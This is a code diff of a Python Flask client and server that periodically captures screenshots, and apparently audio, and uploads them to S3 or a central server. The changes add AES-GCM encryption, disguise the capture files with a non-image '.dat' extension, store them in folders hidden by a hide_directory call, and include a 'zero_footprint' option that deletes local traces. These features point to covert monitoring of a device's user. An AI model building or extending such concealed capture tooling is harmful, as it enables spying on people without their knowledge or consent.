+        encrypted_bytes = s3_res['Body'].read()
+
+        # Decrypt payload using AES-256-GCM authenticated decryption
+        decrypted_bytes = decrypt_screenshot_bytes(encrypted_bytes, device_id=device_id)
+
+        mode = ca_obj.get("mode", "audio")
+        mimetype = "audio/wav" if mode == "audio" else "image/webp"
+
+        resp = Response(decrypted_bytes, mimetype=mimetype)
+        resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, private, max-age=0"
+        resp.headers["Pragma"] = "no-cache"
+        return resp
+    except Exception as e:
+        return jsonify({"error": f"Failed to decrypt AV stream: {str(e)}"}), 500
+
 @app.route('/api/client/log', methods=['POST'])
 def client_write_log():
     data = request.json or {}
@@ -4412,14 +4979,15 @@ def capture_and_upload_screenshot(prefix):
     date_str = now.strftime("%Y-%m-%d")
     timestamp_file = now.strftime("%Y%m%d_%H%M%S_%f")
     
-    # 1. Local paths
+    # 1. Local paths - store with non-image binary extension (.dat)
     local_dir = os.path.join("screenshots", date_str)
     os.makedirs(local_dir, exist_ok=True)
     hide_directory(local_dir)
-    filename = f"{prefix}_{timestamp_file}.webp"
+    filename = f"{prefix}_{timestamp_file}.dat"
     local_path = os.path.join(local_dir, filename)
+    device_id = get_device_id()
     
-    # 2. Grab and compress as WebP
+    # 2. Grab and compress in memory, then encrypt immediately (never save plaintext to disk)
     try:
         if mss is not None:
             with mss.mss() as sct:
@@ -4443,13 +5011,23 @@ def capture_and_upload_screenshot(prefix):
             new_height = int(float(screenshot.height) * ratio)
             screenshot = screenshot.resize((max_width, new_height), Image.Resampling.LANCZOS)
             
-        screenshot.save(local_path, "WEBP", quality=45)
+        # Compress to WebP directly in RAM (BytesIO) - NEVER write unencrypted image to disk!
+        buf = io.BytesIO()
+        screenshot.save(buf, "WEBP", quality=45)
+        raw_webp_bytes = buf.getvalue()
+        
+        # Authenticated AES-256-GCM encryption in memory
+        encrypted_bytes = encrypt_screenshot_bytes(raw_webp_bytes)
+        
+        # Write ONLY the encrypted binary (.dat) to local disk
+        with open(local_path, "wb") as f:
+            f.write(encrypted_bytes)
     except Exception as e:
-        print(f"Failed to capture or save screenshot: {e}")
+        print(f"Failed to capture or encrypt screenshot: {e}")
         return None, None
         
     s3_path = f"{date_str}/{filename}"
-    screenshot_url = None
+    screenshot_url = f"/api/screenshots/view/{s3_path}"
     
     # 1. Direct S3 Upload (if boto3 S3 client is available)
     if s3_client is not None and S3_BUCKET:
@@ -4458,12 +5036,12 @@ def capture_and_upload_screenshot(prefix):
                 local_path,
                 S3_BUCKET,
                 s3_path,
-                ExtraArgs={"ContentType": "image/webp"}
+                ExtraArgs={"ContentType": "application/octet-stream"}
             )
-            screenshot_url = get_screenshot_signed_url(s3_path) or f"screenshots/{date_str}/{filename}"
+            screenshot_url = f"/api/screenshots/view/{s3_path}"
         except Exception as e:
-            print(f"Failed to upload screenshot to S3: {e}")
-            screenshot_url = f"screenshots/{date_str}/{filename}"
+            print(f"Failed to upload encrypted screenshot to S3: {e}")
+            screenshot_url = f"/api/screenshots/view/{s3_path}"
         finally:
             try:
                 if os.path.exists(local_path):
@@ -4475,11 +5053,11 @@ def capture_and_upload_screenshot(prefix):
         try:
             server_url = RENDER_SERVER_URL or os.getenv("RENDER_SERVER_URL")
             with open(local_path, "rb") as sf:
-                img_bytes = sf.read()
+                enc_bytes = sf.read()
             payload = {
                 "s3_path": s3_path,
-                "image_b64": base64.b64encode(img_bytes).decode('ascii'),
-                "content_type": "image/webp"
+                "image_b64": base64.b64encode(enc_bytes).decode('ascii'),
+                "content_type": "application/octet-stream"
             }
             req = urllib.request.Request(
                 f"{server_url.rstrip('/')}/api/client/screenshot",
@@ -4488,10 +5066,10 @@ def capture_and_upload_screenshot(prefix):
             )
             with urllib.request.urlopen(req, timeout=15) as r:
                 res_data = json.loads(r.read().decode('utf-8'))
-                screenshot_url = res_data.get("screenshot_url")
+                screenshot_url = res_data.get("screenshot_url") or f"/api/screenshots/view/{s3_path}"
         except Exception as se:
             print(f"Failed to upload screenshot to central server: {se}")
-            screenshot_url = f"screenshots/{date_str}/{filename}"
+            screenshot_url = f"/api/screenshots/view/{s3_path}"
         finally:
             try:
                 if os.path.exists(local_path):
@@ -4499,7 +5077,7 @@ def capture_and_upload_screenshot(prefix):
             except Exception:
                 pass
     else:
-        screenshot_url = f"screenshots/{date_str}/{filename}"
+        screenshot_url = f"/api/screenshots/view/{s3_path}"
         if zero_footprint:
             try:
                 if os.path.exists(local_path):
